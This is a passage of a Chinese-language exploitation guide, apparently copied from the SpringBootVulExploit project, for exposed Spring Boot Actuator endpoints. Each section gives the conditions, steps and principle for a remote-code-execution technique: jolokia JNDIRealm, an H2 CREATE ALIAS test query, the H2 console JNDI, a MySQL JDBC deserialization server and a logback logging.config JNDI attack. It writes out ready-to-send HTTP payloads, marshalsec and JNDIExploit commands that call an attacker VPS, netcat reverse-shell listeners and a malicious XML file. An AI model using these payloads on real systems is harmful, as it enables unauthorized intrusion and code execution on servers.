<h4 id="漏洞原理：-3"><a href="#漏洞原理：-3" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
<li>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 类的 <code>reloadByURL</code> 方法</li>
<li>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</li>
<li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li>
<li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li>
<li>目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li>
</ol>
<h4 id="漏洞分析：-3"><a href="#漏洞分析：-3" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://xz.aliyun.com/t/4258">spring boot actuator rce via jolokia</a></p>
<h4 id="漏洞环境：-3"><a href="#漏洞环境：-3" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce">repository/springboot-jolokia-logback-rce</a></p>
<p>正常访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9094&#x2F;env</span><br></pre></td></tr></table></figure>



<h3 id="0x05：jolokia-Realm-JNDI-RCE"><a href="#0x05：jolokia-Realm-JNDI-RCE" class="headerlink" title="0x05：jolokia Realm JNDI RCE"></a>0x05：jolokia Realm JNDI RCE</h3><h4 id="利用条件：-8"><a href="#利用条件：-8" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
<li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li>
<li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
<li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141/7u131/8u121(RMI)，但相关环境可绕过</li>
</ul>
<h4 id="利用方法：-8"><a href="#利用方法：-8" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：查看已存在的-MBeans-1"><a href="#步骤一：查看已存在的-MBeans-1" class="headerlink" title="步骤一：查看已存在的 MBeans"></a>步骤一：查看已存在的 MBeans</h5><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>type=MBeanFactory</code> 和 <code>createJNDIRealm</code> 关键词。</p>
<h5 id="步骤二：准备要执行的-Java-代码"><a href="#步骤二：准备要执行的-Java-代码" class="headerlink" title="步骤二：准备要执行的 Java 代码"></a>步骤二：准备要执行的 Java 代码</h5><p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code>JNDIObject.java</code>。</p>
<h5 id="步骤三：托管-class-文件"><a href="#步骤三：托管-class-文件" class="headerlink" title="步骤三：托管 class 文件"></a>步骤三：托管 class 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p>
<h5 id="步骤四：架设恶意-rmi-服务"><a href="#步骤四：架设恶意-rmi-服务" class="headerlink" title="步骤四：架设恶意 rmi 服务"></a>步骤四：架设恶意 rmi 服务</h5><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 rmi 服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/<span class="comment">#JNDIObject 1389</span></span><br></pre></td></tr></table></figure>



<h5 id="步骤五：监听反弹-shell-的端口-1"><a href="#步骤五：监听反弹-shell-的端口-1" class="headerlink" title="步骤五：监听反弹 shell 的端口"></a>步骤五：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure>



<h5 id="步骤六：发送恶意-payload"><a href="#步骤六：发送恶意-payload" class="headerlink" title="步骤六：发送恶意 payload"></a>步骤六：发送恶意 payload</h5><p>根据实际情况修改 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py">springboot-realm-jndi-rce.py</a> 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。</p>
<h4 id="漏洞原理：-4"><a href="#漏洞原理：-4" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
<li>利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm</li>
<li>设置 connectionURL 地址为 RMI Service URL</li>
<li>设置 contextFactory 为 RegistryContextFactory</li>
<li>停止 Realm</li>
<li>启动 Realm 以触发指定 RMI 地址的  JNDI 注入，造成 RCE 漏洞</li>
</ol>
<h4 id="漏洞分析：-4"><a href="#漏洞分析：-4" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html">Yet Another Way to Exploit Spring Boot Actuators via Jolokia</a></p>
<h4 id="漏洞环境：-4"><a href="#漏洞环境：-4" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce">repository/springboot-jolokia-logback-rce</a></p>
<p>正常访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9094&#x2F;env</span><br></pre></td></tr></table></figure>



<h3 id="0x06：restart-h2-database-query-RCE"><a href="#0x06：restart-h2-database-query-RCE" class="headerlink" title="0x06：restart h2 database query RCE"></a>0x06：restart h2 database query RCE</h3><h4 id="利用条件：-9"><a href="#利用条件：-9" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li>
</ul>
<h4 id="利用方法：-9"><a href="#利用方法：-9" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：设置-spring-datasource-hikari-connection-test-query-属性"><a href="#步骤一：设置-spring-datasource-hikari-connection-test-query-属性" class="headerlink" title="步骤一：设置 spring.datasource.hikari.connection-test-query 属性"></a>步骤一：设置 spring.datasource.hikari.connection-test-query 属性</h5><blockquote>
<p>⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p>
</blockquote>
<p>spring 1.x（无回显执行命令）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.hikari.connection-test-query&#x3D;CREATE ALIAS T5 AS CONCAT(&#39;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#39;,&#39;me.getRun&#39;,&#39;time().exe&#39;,&#39;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#39;);CALL T5(&#39;cmd&#39;,&#39;&#x2F;c&#39;,&#39;calc&#39;);</span><br></pre></td></tr></table></figure>

<p>spring 2.x（无回显执行命令）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT(&#39;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#39;,&#39;me.getRun&#39;,&#39;time().exe&#39;,&#39;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#39;);CALL T5(&#39;cmd&#39;,&#39;&#x2F;c&#39;,&#39;calc&#39;);&quot;&#125;</span><br></pre></td></tr></table></figure>



<h5 id="步骤二：重启应用"><a href="#步骤二：重启应用" class="headerlink" title="步骤二：重启应用"></a>步骤二：重启应用</h5><p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="漏洞原理：-5"><a href="#漏洞原理：-5" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
<li>spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 <code>CREATE ALIAS</code> 创建自定义函数的 SQL 语句</li>
<li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句</li>
<li>restart 重启应用，会建立新的数据库连接</li>
<li>如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞</li>
</ol>
<h4 id="漏洞分析：-5"><a href="#漏洞分析：-5" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database">remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database</a></p>
<h4 id="漏洞环境：-5"><a href="#漏洞环境：-5" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce">repository/springboot-h2-database-rce</a></p>
<p>正常访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9096&#x2F;actuator&#x2F;env</span><br></pre></td></tr></table></figure>



<h3 id="0x07：h2-database-console-JNDI-RCE"><a href="#0x07：h2-database-console-JNDI-RCE" class="headerlink" title="0x07：h2 database console JNDI RCE"></a>0x07：h2 database console JNDI RCE</h3><h4 id="利用条件：-10"><a href="#利用条件：-10" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
<li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li>
<li>spring 配置中启用 h2 console  <code>spring.h2.console.enabled=true</code></li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
<li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）</li>
</ul>
<h4 id="利用方法：-10"><a href="#利用方法：-10" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：访问路由获得-jsessionid"><a href="#步骤一：访问路由获得-jsessionid" class="headerlink" title="步骤一：访问路由获得 jsessionid"></a>步骤一：访问路由获得 jsessionid</h5><p>直接访问目标开启 h2 console 的默认路由 <code>/h2-console</code>，目标会跳转到页面 <code>/h2-console/login.jsp?jsessionid=xxxxxx</code>，记录下实际的 <code>jsessionid=xxxxxx</code> 值。</p>
<h5 id="步骤二：准备要执行的-Java-代码-1"><a href="#步骤二：准备要执行的-Java-代码-1" class="headerlink" title="步骤二：准备要执行的 Java 代码"></a>步骤二：准备要执行的 Java 代码</h5><p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code>JNDIObject.java</code>，</p>
<p>使用兼容低版本 jdk 的方式编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac -<span class="built_in">source</span> 1.5 -target 1.5 JNDIObject.java</span><br></pre></td></tr></table></figure>

<p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>
<h5 id="步骤三：托管-class-文件-1"><a href="#步骤三：托管-class-文件-1" class="headerlink" title="步骤三：托管 class 文件"></a>步骤三：托管 class 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p>
<h5 id="步骤四：架设恶意-ldap-服务-1"><a href="#步骤四：架设恶意-ldap-服务-1" class="headerlink" title="步骤四：架设恶意 ldap 服务"></a>步骤四：架设恶意 ldap 服务</h5><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/<span class="comment">#JNDIObject 1389</span></span><br></pre></td></tr></table></figure>



<h5 id="步骤五：监听反弹-shell-的端口-2"><a href="#步骤五：监听反弹-shell-的端口-2" class="headerlink" title="步骤五：监听反弹 shell 的端口"></a>步骤五：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lv 443</span><br></pre></td></tr></table></figure>



<h5 id="步骤六：发包触发-JNDI-注入"><a href="#步骤六：发包触发-JNDI-注入" class="headerlink" title="步骤六：发包触发 JNDI 注入"></a>步骤六：发包触发 JNDI 注入</h5><p>根据实际情况，替换下面数据中的 <code>jsessionid=xxxxxx</code>、<code>www.example.com</code> 和 <code>ldap://your-vps-ip:1389/JNDIObject</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /h2-console/login.do?jsessionid=xxxxxx</span><br><span class="line">Host: www.example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx</span><br><span class="line"></span><br><span class="line">language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=ldap://your-vps-ip:1389/JNDIObject&amp;user=&amp;password=</span><br></pre></td></tr></table></figure>



<h4 id="漏洞分析：-6"><a href="#漏洞分析：-6" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://mp.weixin.qq.com/s/Yn5U8WHGJZbTJsxwUU3UiQ">Spring Boot + H2数据库JNDI注入</a></p>
<h4 id="漏洞环境：-6"><a href="#漏洞环境：-6" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce">repository/springboot-h2-database-rce</a></p>
<p>正常访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9096&#x2F;h2-console</span><br></pre></td></tr></table></figure>



<h3 id="0x08：mysql-jdbc-deserialization-RCE"><a href="#0x08：mysql-jdbc-deserialization-RCE" class="headerlink" title="0x08：mysql jdbc deserialization RCE"></a>0x08：mysql jdbc deserialization RCE</h3><h4 id="利用条件：-11"><a href="#利用条件：-11" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标环境中存在 <code>mysql-connector-java</code> 依赖</li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>
<h4 id="利用方法：-11"><a href="#利用方法：-11" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：查看环境依赖"><a href="#步骤一：查看环境依赖" class="headerlink" title="步骤一：查看环境依赖"></a>步骤一：查看环境依赖</h5><p>GET 请求 <code>/env</code> 或 <code>/actuator/env</code>，搜索环境变量（classpath）中是否有 <code>mysql-connector-java</code>  关键词，并记录下其版本号（5.x 或 8.x）；</p>
<p>搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如  <code>commons-collections</code>、<code>Jdk7u21</code>、<code>Jdk8u20</code> 等；</p>
<p>搜索 <code>spring.datasource.url</code> 关键词，记录下其 <code>value</code>  值，方便后续恢复其正常 jdbc url 值。</p>
<h5 id="步骤二：架设恶意-rogue-mysql-server"><a href="#步骤二：架设恶意-rogue-mysql-server" class="headerlink" title="步骤二：架设恶意 rogue mysql server"></a>步骤二：架设恶意 rogue mysql server</h5><p>在自己控制的服务器上运行 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本，并使用 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections3 calc &gt; payload.ser</span><br></pre></td></tr></table></figure>

<p>在脚本<strong>同目录下</strong>生成 <code>payload.ser</code> 反序列化 payload 文件，供脚本使用。</p>
<h5 id="步骤三：设置-spring-datasource-url-属性"><a href="#步骤三：设置-spring-datasource-url-属性" class="headerlink" title="步骤三：设置 spring.datasource.url 属性"></a>步骤三：设置 spring.datasource.url 属性</h5><blockquote>
<p>⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</p>
</blockquote>
<p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jdbc:mysql:&#x2F;&#x2F;your-vps-ip:3306&#x2F;mysql?characterEncoding&#x3D;utf8&amp;useSSL&#x3D;false&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize&#x3D;true</span><br></pre></td></tr></table></figure>

<p> mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jdbc:mysql:&#x2F;&#x2F;your-vps-ip:3306&#x2F;mysql?characterEncoding&#x3D;utf8&amp;useSSL&#x3D;false&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize&#x3D;true</span><br></pre></td></tr></table></figure>



<p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.url&#x3D;对应属性值</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;&#125;</span><br></pre></td></tr></table></figure>



<h5 id="步骤四：刷新配置-1"><a href="#步骤四：刷新配置-1" class="headerlink" title="步骤四：刷新配置"></a>步骤四：刷新配置</h5><p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="步骤五：触发数据库查询"><a href="#步骤五：触发数据库查询" class="headerlink" title="步骤五：触发数据库查询"></a>步骤五：触发数据库查询</h5><p>尝试访问网站已知的数据库查询的接口，例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p>
<h5 id="步骤六：恢复正常-jdbc-url"><a href="#步骤六：恢复正常-jdbc-url" class="headerlink" title="步骤六：恢复正常 jdbc url"></a>步骤六：恢复正常 jdbc url</h5><p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的 <code>spring.datasource.url</code> 的原始 <code>value</code> 值</p>
<h4 id="漏洞原理：-6"><a href="#漏洞原理：-6" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
<li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li>
<li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li>
<li>当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接</li>
<li>然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据</li>
<li>目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞</li>
</ol>
<h4 id="漏洞分析：-7"><a href="#漏洞分析：-7" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">New-Exploit-Technique-In-Java-Deserialization-Attack</a></p>
<h4 id="漏洞环境：-7"><a href="#漏洞环境：-7" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><blockquote>
<p>需要配置 application.properties 中的 spring.datasource.url、spring.datasource.username、spring.datasource.password，保证可以正常连上 mysql 数据库，否则程序启动时就会报错退出</p>
</blockquote>
<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-mysql-jdbc-rce">repository/springboot-mysql-jdbc-rce</a></p>
<p>正常访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9097&#x2F;actuator&#x2F;env</span><br></pre></td></tr></table></figure>

<p>发送完 payload 后触发漏洞：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9097&#x2F;product&#x2F;list</span><br></pre></td></tr></table></figure>



<h3 id="0x09：restart-logging-config-logback-JNDI-RCE"><a href="#0x09：restart-logging-config-logback-JNDI-RCE" class="headerlink" title="0x09：restart logging.config logback JNDI RCE"></a>0x09：restart logging.config logback JNDI RCE</h3><h4 id="利用条件：-12"><a href="#利用条件：-12" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1(LDAP)，但相关环境可绕过</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出</li>
<li>⚠️ JNDI 服务返回的 object 需要实现 <code>javax.naming.spi.ObjectFactory</code> 接口，否则会导致程序异常退出</li>
</ul>
<h4 id="利用方法：-12"><a href="#利用方法：-12" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-xml-文件"><a href="#步骤一：托管-xml-文件" class="headerlink" title="步骤一：托管 xml 文件"></a>步骤一：托管 xml 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以 <code>xml</code> 结尾的  <code>example.xml</code> 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;ldap://your-vps-ip:1389/TomcatBypass/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9y&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="步骤二：托管恶意-ldap-服务及代码"><a href="#步骤二：托管恶意-ldap-服务及代码" class="headerlink" title="步骤二：托管恶意 ldap 服务及代码"></a>步骤二：托管恶意 ldap 服务及代码</h5><p>参考<a href="https://landgrey.me/blog/21/">文章</a>，修改 <a href="https://github.com/feihong-cs/JNDIExploit">JNDIExploit</a> 并启动（也可以使用其他方法）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.0-SNAPSHOT.jar -i your-vps-ip</span><br></pre></td></tr></table></figure>



<h5 id="步骤三：设置-logging-config-属性"><a href="#步骤三：设置-logging-config-属性" class="headerlink" title="步骤三：设置 logging.config 属性"></a>步骤三：设置 logging.config 属性</h5><p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.xml</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.xml&quot;&#125;</span><br></pre></td></tr></table></figure>



<h5 id="步骤四：重启应用"><a href="#步骤四：重启应用" class="headerlink" title="步骤四：重启应用"></a>步骤四：重启应用</h5><p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="漏洞原理：-7"><a href="#漏洞原理：-7" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
<li>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</li>
<li>restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容</li>
<li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li>
<li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li>
<li>目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li>
</ol>
<h4 id="漏洞分析：-8"><a href="#漏洞分析：-8" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​    <a href="https://xz.aliyun.com/t/4258">spring boot actuator rce via jolokia</a></p>
<p>​    <a href="https://landgrey.me/blog/21/">https://landgrey.me/blog/21/</a></p>
<h4 id="漏洞环境：-8"><a href="#漏洞环境：-8" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository/springboot-restart-rce</a></p>
<p>正常访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9098&#x2F;actuator&#x2F;env</span><br></pre></td></tr></table></figure>



<h3 id="0x0A：restart-logging-config-groovy-RCE"><a href="#0x0A：restart-logging-config-groovy-RCE" class="headerlink" title="0x0A：restart logging.config groovy RCE"></a>0x0A：restart logging.config groovy RCE</h3><h4 id="利用条件：-13"><a href="#利用条件：-13" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li>
<li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li>
</ul>
<h4 id="利用方法：-13"><a href="#利用方法：-13" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-groovy-文件"><a href="#步骤一：托管-groovy-文件" class="headerlink" title="步骤一：托管 groovy 文件"></a>步骤一：托管 groovy 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
